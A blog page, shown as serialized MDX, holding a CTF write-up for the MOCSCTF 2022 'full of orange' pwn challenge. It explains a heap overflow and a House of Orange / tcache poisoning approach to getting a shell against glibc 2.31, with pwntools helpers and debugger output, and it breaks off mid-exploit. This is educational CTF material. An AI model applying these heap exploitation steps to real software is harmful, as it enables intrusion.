{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var d=Object.create;var l=Object.defineProperty;var h=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var m=Object.getPrototypeOf,u=Object.prototype.hasOwnProperty;var t=a=>l(a,\"__esModule\",{value:!0});var N=(a,c)=>()=>(c||a((c={exports:{}}).exports,c),c.exports),k=(a,c)=>{t(a);for(var s in c)l(a,s,{get:c[s],enumerable:!0})},x=(a,c,s)=>{if(c&&typeof c==\"object\"||typeof c==\"function\")for(let n of p(c))!u.call(a,n)&&n!==\"default\"&&l(a,n,{get:()=>c[n],enumerable:!(s=h(c,n))||s.enumerable});return a},f=a=>x(t(l(a!=null?d(m(a)):{},\"default\",a&&a.__esModule&&\"default\"in a?{get:()=>a.default,enumerable:!0}:{value:a,enumerable:!0})),a);var r=N((z,o)=>{o.exports=_jsx_runtime});var y={};k(y,{default:()=>w,frontmatter:()=>g});var e=f(r()),g={title:\"MOCSCTF 2022 \\u2013 full of orange\",date:\"2022-02-28\",draft:!1,authors:[\"Johnathan\"],tags:[\"MOCSCTF 2022\",\"pwn\",\"heap\",\"Shell\",\"overflow\",\"Binary Exploit\"],summary:\"Heap overflow for shell.\",canonical:\"https://github.com/nhtri2003gmail/writeup-mocsctf2022.mocsctf.com-orange\"};function b(a={}){let{wrapper:c}=a.components||{};return c?(0,e.jsx)(c,Object.assign({},a,{children:(0,e.jsx)(s,{})})):s();function s(){let n=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",h3:\"h3\",ul:\"ul\",li:\"li\",hr:\"hr\",p:\"p\",code:\"code\",pre:\"pre\",img:\"img\",strong:\"strong\",ol:\"ol\",br:\"br\"},a.components),{TOCInline:i}=n;return i||_(\"TOCInline\",!0),(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h2,{id:\"full-of-orange\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#full-of-orange\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Full of Orange\"]}),`\n`,(0,e.jsx)(i,{toc:a.toc,exclude:[\"Full of Orange\",\"Reference source\"],toHeading:3}),`\n`,(0,e.jsxs)(n.h3,{id:\"reference-source\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#reference-source\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Reference source\"]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsx)(n.li,{children:(0,e.jsx)(n.a,{href:\"https://1ce0ear.github.io/2017/11/26/study-house-of-orange/\",children:\"Understanding the house of orange \\u2013 1ce0ear\"})}),`\n`,(0,e.jsx)(n.li,{children:(0,e.jsx)(n.a,{href:\"https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html\",children:\"HITCON CTF Qual 2016 - House of Orange Write up \\u2013 Pwning My Life\"})}),`\n`,(0,e.jsx)(n.li,{children:(0,e.jsx)(n.a,{href:\"https://github.com/shellphish/how2heap\",children:\"shellphish/how2heap \\u2013 GitHub\"})}),`\n`,(0,e.jsx)(n.li,{children:(0,e.jsx)(n.a,{href:\"https://dystopia.sg/seccon-beginners-2021-freeless/\",children:\"SECCON BEGINNERS: FREELESS (PWN) \\u2013 THE DYSTOPIAN KNIGHT\"})}),`\n`]}),`\n`,(0,e.jsx)(n.hr,{}),`\n`,(0,e.jsxs)(n.p,{children:[\"Origin challenge link: \",(0,e.jsx)(n.a,{href:\"https://mocsctf2022.mocsctf.com/challenges\",children:\"https://mocsctf2022.mocsctf.com/challenges\"})]}),`\n`,(0,e.jsxs)(n.p,{children:[\"You can also download challenge in my repo: \",(0,e.jsx)(n.a,{href:\"https://github.com/nhtri2003gmail/writeup-mocsctf2022.mocsctf.com-orange/blob/master/orange.zip\",children:\"orange.zip\"})]}),`\n`,(0,e.jsx)(n.p,{children:\"There will be 2 files in zip:\"}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsx)(n.li,{children:\"freefree\"}),`\n`,(0,e.jsx)(n.li,{children:\"libc-2.31.so\"}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Download zip, then extract and use \",(0,e.jsx)(n.code,{children:\"pwninit\"}),\" to patch libc to challenge file. And now let\\u2019s start!\"]}),`\n`,(0,e.jsxs)(n.h2,{id:\"1-find-bug\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#1-find-bug\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"1. Find bug\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"First, we use \",(0,e.jsx)(n.code,{children:\"file\"}),\" command to check for basic infomation:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"file\"}),` freefree\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"freefree: ELF \",(0,e.jsx)(n.span,{className:\"token number\",children:\"64\"}),\"-bit LSB pie executable, x86-64, version \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"SYSV\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\", dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"sha1\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"88c0525daecc504cb81ee1e9104e218cfa4ffdc6, \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" GNU/Linux \",(0,e.jsx)(n.span,{className:\"token number\",children:\"3.2\"}),`.0, not stripped\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"This is a 64-bit file without being stripped. Next, we will use \",(0,e.jsx)(n.code,{children:\"checksec\"}),\" to check for all security of challenge file:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`$ checksec freefree\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    PIE:      PIE enabled\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Well, it\\u2019s \",(0,e.jsx)(n.code,{children:\"PIE enabled\"}),\", quite hard for us when we need to debug things. Also \",(0,e.jsx)(n.code,{children:\"NX enabled\"}),\" which means we cannot get our shellcode on stack works.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Finally, let\\u2019s fire up ghidra and get the main flow of program. There are just 1 interesing function is main() with 4 option \",(0,e.jsx)(n.code,{children:\"malloc\"}),\", \",(0,e.jsx)(n.code,{children:\"gets\"}),\" which we input to chunk, \",(0,e.jsx)(n.code,{children:\"puts\"}),\" which print out data of that chunk terminated by null-byte and \",(0,e.jsx)(n.code,{children:\"exit\"}),\".\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Let\\u2019s run the program to get it easily. At the menu, we can see things like this:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/menu.png\",alt:\"menu.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"It tells us that we could use a technique called \",(0,e.jsx)(n.a,{href:\"https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c\",children:\"House of Orange\"}),\". Analizing in ghidra and run in terminal, we know that it can take the variable name from \",(0,e.jsx)(n.code,{children:\"A\"}),\" to \",(0,e.jsx)(n.code,{children:\"Z\"}),\" by getting its index:\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/variable.png\",alt:\"variable.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So that \",(0,e.jsx)(n.code,{children:\"X\"}),\" can be from \",(0,e.jsx)(n.code,{children:\"A\"}),\" to \",(0,e.jsx)(n.code,{children:\"Z\"}),\":\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/input_var_terminal.png\",alt:\"input_var_terminal.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"This means we can contain and control upto 25 chunk. And one more thing we can notice is that with each chunk, we can write unlimited data to that chunk, hence overwrite the next chunk \\u2192 \",(0,e.jsx)(n.strong,{children:\"Heap Overflow\"}),\":\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/gets_main.png\",alt:\"gets_main.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"And that\\u2019s all we can find, just 25 chunks with \",(0,e.jsx)(n.strong,{children:\"Heap Overflow\"}),\" and no free(), let\\u2019s see the magic right now!\"]}),`\n`,(0,e.jsxs)(n.h2,{id:\"2-brainstorming\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#2-brainstorming\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"2. Brainstorming\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"If you are not familiar with heap, just read this to know about all kinds of chunk: \",(0,e.jsx)(n.a,{href:\"https://guyinatuxedo.github.io/25-heap/index.html\",children:\"https://guyinatuxedo.github.io/25-heap/index.html\"})]}),`\n`,(0,e.jsxs)(n.h3,{id:\"technique\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#technique\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Technique\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"The main thing to remember is that if we \",(0,e.jsx)(n.code,{children:\"malloc(0x1000)\"}),\" but top chunk size is just 0x300, which means that top chunk cannot satisfy the malloc. Hence, that top chunk will be freed and program will malloc 0x1000 byte on the next page of heap.\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`---------------------                    -----------------------\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`|    some chunks    |                    |     some chunks     |\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`---------------------   malloc(0x1000)   -----------------------\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`| top chunk (0x300) |  --------------->  | freed chunk (0x300) |\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`---------------------                    -----------------------\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`| unallocated space |                    | new chunk (0x1000)  |\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`|                   |                    -----------------------\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`|                   |                    |    new top chunk    |\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`---------------------                    -----------------------\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The other thing is that we can only malloc maximum 0x1000 bytes.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"To be clear, we will take this example below. The heap is usually allocated with a top chunk of size 0x21000. So when we malloc a 0x400-byte chunk, the top chunk will split itself and remain \",(0,e.jsx)(n.code,{children:\"0x21000 - 0x400 = 0x20c00\"}),\" with the bit \",(0,e.jsx)(n.code,{children:\"PREV_INUSE\"}),\" is set:\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/Technique_malloc1.png\",alt:\"Technique_malloc1.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Now we want to malloc maximum 0x1000, so the top chunk size need to be lower than 0x1000 to conduct this technique. Let\\u2019s assume that we can change the top chunk size by somehow. Because there is a check about the alignment of top chunk so just to make sure that:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`(top chunk address + top chunk size) % 0x1000 == 0\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"In our example, the size we want to overwrite into is \",(0,e.jsx)(n.code,{children:\"0xc00\"}),\":\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/Technique_malloc4.png\",alt:\"Technique_malloc4.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Address \",(0,e.jsx)(n.code,{children:\"0x55555555b000\"}),\" can satisfy the alignment so we will change top chunk size from 0x20c00 to 0xc00 with the \",(0,e.jsx)(n.code,{children:\"PREV_INUSE\"}),\" bit is set.\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/Technique_malloc2.png\",alt:\"Technique_malloc2.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So that when we malloc with a large number \",(0,e.jsx)(n.code,{children:\"malloc(0x1000)\"}),\", that top chunk cannot satisfy our malloc. Then that top chunk will be freed without any error:\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/Technique_malloc3.png\",alt:\"Technique_malloc3.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Because top chunk size is 0xc00, which is large. So when top chunk is freed, it goes to unsorted bin.\"}),`\n`,(0,e.jsx)(n.p,{children:\"So if our top chunk size is small enough, which fit size of tcache, when we use this technique to free the top chunk, it will go to tcache bin. That\\u2019s sound interesting, right?\"}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[\"Summary technique:\",`\n`,(0,e.jsxs)(n.ol,{children:[`\n`,(0,e.jsx)(n.li,{children:\"We can malloc maximum 0x1000 bytes\"}),`\n`,(0,e.jsx)(n.li,{children:\"Malloc chunk larger than top chunk will free that top chunk\"}),`\n`,(0,e.jsxs)(n.li,{children:[\"Overwriting top chunk size require 2 constraints:\",`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[\"The size of top chunk need to be aligned with size of 0x1000\",(0,e.jsx)(n.br,{}),`\n`,(0,e.jsx)(n.code,{children:\"(top chunk address + top chunk size) % 0x1000 == 0\"})]}),`\n`,(0,e.jsxs)(n.li,{children:[\"The \",(0,e.jsx)(n.code,{children:\"PREV_INUSE\"}),\" bit need to be set\"]}),`\n`]}),`\n`]}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.h3,{id:\"brainstorming\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#brainstorming\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Brainstorming\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"With the origin House of Orange, it first frees the top chunk, then fake the \",(0,e.jsx)(n.code,{children:\"_IO_list_all\"}),\" so that when we malloc again, it will execute \",(0,e.jsx)(n.code,{children:\"_IO_list_all\"}),\" with string \",(0,e.jsx)(n.code,{children:\"/bin/sh\"}),\". But that\\u2019s just for libc \\u2264 2.23 because those libc from \\u2265 2.24, the check is changed, faking \",(0,e.jsx)(n.code,{children:\"_IO_list_all\"}),\" is not successful anymore.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Because our provided libc is 2.31, we still can free the top chunk. First we make a large top chunk, then free it and we get libc main arena address. Next we will free 2 times with 2 small top chunk. So that those small top chunk can go to tcache bin (libc \\u2265 2.28 has tcache enabled).\"}),`\n`,(0,e.jsx)(n.p,{children:\"And then, we abuse the tcache link list by overwriting the forward pointer to whatever we want and we get the shell.\"}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[\"Summary:\",`\n`,(0,e.jsxs)(n.ol,{children:[`\n`,(0,e.jsx)(n.li,{children:\"Leak main arena address\"}),`\n`,(0,e.jsx)(n.li,{children:\"Free 2 small chunks\"}),`\n`,(0,e.jsx)(n.li,{children:\"Get shell\"}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.h2,{id:\"3-exploit\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#3-exploit\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"3. Exploit\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Before we start our exploitation, I wrote these function to help our exploit more convenient\"}),`\n`,(0,e.jsxs)(\"details\",{children:[(0,e.jsx)(\"summary\",{children:\"Code snippet\"}),(0,e.jsx)(\"p\",{children:(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"getchar\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"return\"}),\" string\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"ascii_uppercase\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"malloc\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" num\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'> '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'{}=malloc({})'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"format\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"getchar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" num\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"gets\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'> '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'gets({})'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"format\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"getchar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  time\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sleep\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendline\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"puts\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'> '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'puts({})'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"format\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"getchar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Receive data outside\"}),`\n`]})]})})})]}),`\n`,(0,e.jsx)(n.p,{children:\"And now let\\u2019s start!\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-1-leak-main-arena-address\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-1-leak-main-arena-address\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 1: Leak main arena address\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"At first, we will need a chunk with index 0 (means \",(0,e.jsx)(n.code,{children:\"A\"}),\" because we use the \",(0,e.jsx)(n.code,{children:\"getchar()\"}),\" function to turn index to char) with any size so that we can overwrite all the next chunk with just chunk \",(0,e.jsx)(n.code,{children:\"A\"}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`malloc(0, 0x10)\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Let\\u2019s see where our chunk \",(0,e.jsx)(n.code,{children:\"A\"}),\" is saved on stack after a first malloc:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571be0\\u2502+0x0000: \"A=malloc(16)\\\\n\"   \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571be8\\u2502+0x0008: 0x0000000a29363128 (\"(16)\\\\n\"?)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571bf0\\u2502+0x0010: 0x0000564641e852a0  \\u2192  0x0000000000000000    # Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571bf8\\u2502+0x0018: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c00\\u2502+0x0020: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c08\\u2502+0x0028: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c10\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c18\\u2502+0x0038: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`...\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So it will save our malloc address from chunk \",(0,e.jsx)(n.code,{children:\"A\"}),\" to chunk \",(0,e.jsx)(n.code,{children:\"Z\"}),\" down of the stack like that. Let\\u2019s check the top chunk size:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/20xg 0x0000564641e852a0-0x10\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e85290: 0x0000000000000000  0x0000000000000021    <-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852a0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852b0: 0x0000000000000000  0x0000000000020d51    <-- Top chunk\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852c0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852d0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852e0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852f0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e85300: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e85310: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e85320: 0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So our top chunk size now is \",(0,e.jsx)(n.code,{children:\"0x20d51\"}),\" with the \",(0,e.jsx)(n.code,{children:\"PREV_INUSE\"}),\" bit set. If we want to free that top chunk using the above technique (malloc a chunk larger than top chunk), we need to make our top chunk to be smaller because we can only malloc maximum 0x1000, which means we need to malloc around 20 chunks with size 0x1000. That would be long.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"So we will change the top chunk size with the \",(0,e.jsx)(n.strong,{children:\"Heap Overflow\"}),\" bug. Remember that our top chunk is aligned with 0x1000 so we need to calculate the top chunk size first:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`0x55fad6324000 - 0x55fad63232b0 = 0xd050\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So overwriting \",(0,e.jsx)(n.code,{children:\"0xd051\"}),\" (with \",(0,e.jsx)(n.code,{children:\"PREV_INUSE\"}),\" bit) to top chunk size and malloc \",(0,e.jsx)(n.code,{children:\"0x1000\"}),\" byte will free our top chunk. Code:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change topchunk size\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload 